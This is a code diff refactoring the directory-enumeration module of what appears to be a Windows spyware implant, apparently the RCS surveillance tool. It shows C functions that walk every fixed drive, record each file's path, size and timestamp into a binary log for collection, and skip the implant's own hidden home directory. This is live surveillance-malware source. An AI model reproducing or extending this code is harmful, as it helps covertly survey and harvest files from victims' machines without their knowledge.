@@ -1,8 +1,9 @@
 #include <windows.h>
 #include <stdio.h>
 #include "common.h"
-#include "bin_string.h"
+#include <rcs/bin_string.h>
 #include "LOG.h"
+#include "bss.h"
 
 typedef struct {
 #define DIR_EXP_VERSION 2010031501
@@ -14,7 +15,7 @@ typedef struct {
 	DWORD file_size_lo;
 	DWORD file_size_hi;
 	FILETIME last_write;
-} directory_header_struct;
+} DIRECTORY_HEADER;
 
 WCHAR *CompleteDirectoryPath(WCHAR *start_path, WCHAR *file_name, WCHAR *dest_path)
 {
@@ -30,54 +31,58 @@ WCHAR *CompleteDirectoryPath(WCHAR *start_path, WCHAR *file_name, WCHAR *dest_pa
 	return dest_path;
 }
 
-WCHAR *RecurseDirectory(WCHAR *start_path, WCHAR *recurse_path)
+static WCHAR *RecurseDirectory(WCHAR *start_path, WCHAR *recurse_path)
 {
 	_snwprintf_s(recurse_path, MAX_PATH, _TRUNCATE, L"%s\\*", start_path);	
 	return recurse_path;
 }
 
-// Ritorna FALSE se la esplora ed e' vuota oppure se non e' valida
-BOOL ExploreDirectory(HANDLE hdest, WCHAR *start_path, DWORD depth)
+BOOL EnumerateDirectory(HANDLE hdest, WCHAR* start_path, DWORD depth);
+
+static BOOL EnumerateRootDirectory(HANDLE hDest, DWORD depth)
+{
+	WCHAR recurse_path[MAX_PATH];
+	DIRECTORY_HEADER directory_header;
+
+	WCHAR drive_letter[3];
+
+	drive_letter[1] = L':';
+	drive_letter[2] = 0;
+
+	for (drive_letter[0] = L'A'; drive_letter[0] <= L'Z'; drive_letter[0]++) {
+		if (FNC(GetDriveTypeW)(drive_letter) == DRIVE_FIXED) {
+			ZeroMemory(&directory_header, sizeof(DIRECTORY_HEADER));
+			directory_header.version = DIR_EXP_VERSION;
+			directory_header.flags |= PATH_IS_DIRECTORY;
+			directory_header.path_len = wcslen(drive_letter) * 2;
+			if (!EnumerateDirectory(hDest, RecurseDirectory(drive_letter, recurse_path), depth - 1))
+				directory_header.flags |= PATH_IS_EMPTY;
+
+			bin_buf tolog;
+			tolog.add(&directory_header, sizeof(directory_header));
+			tolog.add(drive_letter, directory_header.path_len);
+			Log_WriteFile(hDest, tolog.get_buf(), tolog.get_len());
+		}
+	}
+	return TRUE;
+}
+
+static BOOL EnumerateDirectory(HANDLE hDest, WCHAR* start_path, DWORD depth)
 {
 	WIN32_FIND_DATAW finddata;
 	HANDLE hfind;
 	BOOL is_full = FALSE;
-	directory_header_struct directory_header;
+	DIRECTORY_HEADER directory_header;
 	WCHAR file_path[MAX_PATH], recurse_path[MAX_PATH];
 	WCHAR hidden_path[MAX_PATH];
 
-	if (hdest==NULL || hdest==INVALID_HANDLE_VALUE || start_path==NULL)
+	if (hDest == NULL || hDest == INVALID_HANDLE_VALUE || start_path == NULL)
 		return FALSE;
 
-	if (depth==0)
+	if (depth == 0)
 		return TRUE;
 
-	_snwprintf_s(hidden_path, MAX_PATH, _TRUNCATE, L"%S", H4_HOME_DIR);		
-
-	// Bisogna partire dalla lista dei drive
-	if (!wcscmp(start_path, L"/")) {
-		WCHAR drive_letter[3];
-		
-		drive_letter[1]=L':';
-		drive_letter[2]=0;
-
-		for (drive_letter[0]=L'A'; drive_letter[0]<=L'Z'; drive_letter[0]++) {
-			if (FNC(GetDriveTypeW)(drive_letter) == DRIVE_FIXED) {
-				ZeroMemory(&directory_header, sizeof(directory_header_struct));
-				directory_header.version = DIR_EXP_VERSION;
-				directory_header.flags |= PATH_IS_DIRECTORY;
-				directory_header.path_len = wcslen(drive_letter)*2;
-				if (!ExploreDirectory(hdest, RecurseDirectory(drive_letter, recurse_path), depth-1))
-					directory_header.flags |= PATH_IS_EMPTY;
-				
-				bin_buf tolog;
-				tolog.add(&directory_header, sizeof(directory_header));
-				tolog.add(drive_letter, directory_header.path_len);
-				Log_WriteFile(hdest, tolog.get_buf(), tolog.get_len());
-			}
-		}
-		return TRUE;
-	}
+	_snwprintf_s(hidden_path, MAX_PATH, _TRUNCATE, L"%S", shared.H4_HOME_DIR);
 
 	hfind = FNC(FindFirstFileW)(start_path, &finddata);
 	if (hfind == INVALID_HANDLE_VALUE)
@@ -88,7 +93,7 @@ BOOL ExploreDirectory(HANDLE hdest, WCHAR *start_path, DWORD depth)
 			continue;
 
 		is_full = TRUE;
-		ZeroMemory(&directory_header, sizeof(directory_header_struct));
+		ZeroMemory(&directory_header, sizeof(DIRECTORY_HEADER));
 		directory_header.version = DIR_EXP_VERSION;
 		directory_header.file_size_hi = finddata.nFileSizeHigh;
 		directory_header.file_size_lo = finddata.nFileSizeLow;
@@ -96,20 +101,32 @@ BOOL ExploreDirectory(HANDLE hdest, WCHAR *start_path, DWORD depth)
 		if (finddata.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
 			directory_header.flags |= PATH_IS_DIRECTORY;
 		CompleteDirectoryPath(start_path, finddata.cFileName, file_path);
-		directory_header.path_len = wcslen(file_path)*2;
+		directory_header.path_len = wcslen(file_path) * 2;
 
-		if (directory_header.flags & PATH_IS_DIRECTORY) 
-			if (!ExploreDirectory(hdest, RecurseDirectory(file_path, recurse_path), depth-1))
+		if (directory_header.flags & PATH_IS_DIRECTORY)
+			if (!EnumerateDirectory(hDest, RecurseDirectory(file_path, recurse_path), depth - 1))
 				directory_header.flags |= PATH_IS_EMPTY;
 
 		bin_buf tolog;
 		tolog.add(&directory_header, sizeof(directory_header));
 		tolog.add(file_path, directory_header.path_len);
-		Log_WriteFile(hdest, tolog.get_buf(), tolog.get_len());
-		
-	} while(FNC(FindNextFileW)(hfind, &finddata));
+		Log_WriteFile(hDest, tolog.get_buf(), tolog.get_len());
+
+	} while (FNC(FindNextFileW)(hfind, &finddata));
 	FNC(FindClose)(hfind);
 	return is_full;
+
+}
+
+// Ritorna FALSE se la esplora ed e' vuota oppure se non e' valida
+BOOL ExploreDirectory(HANDLE hdest, WCHAR *start_path, DWORD depth)
+{
+	// Bisogna partire dalla lista dei drive
+	if (!wcscmp(start_path, L"/")) {
+		return EnumerateRootDirectory(hdest, depth);
+	}
+
+	return EnumerateDirectory(hdest, start_path, depth);
 }
 
 #define MAX_DOWNLOAD_CHUNK_SIZE (25*1024*1024)
